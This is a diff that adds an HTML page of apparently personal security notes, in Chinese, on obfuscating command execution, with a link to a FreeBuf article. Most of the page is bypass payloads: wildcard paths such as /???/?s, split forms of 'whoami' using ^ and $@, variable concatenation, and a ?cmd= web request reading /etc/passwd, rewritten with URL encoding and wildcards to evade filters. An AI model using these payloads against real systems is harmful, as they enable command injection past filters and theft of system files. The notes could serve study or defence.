@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>命令执行混淆</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>命令执行混淆</h1><br/><a href="http://www.freebuf.com/articles/web/160175.html">http://www.freebuf.com/articles/web/160175.html</a><br /><br />可以使用通配符<br /><br />例如<br />/bin/ls<br />可以使用<br />/???/?s<br /><br />who^am^i<br />(windows)<br /><br />who$@ami<br /><br />a=who<br />b=ami<br />$1$2<br /><br /><br />/?cmd=cat+/etc/passwd<br />可以改为<br />/?cmd=%2f???%2f??t%20%2f???%2fp??s??<br /><br />/?cmd=/bin/cat /etc/passwd<br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
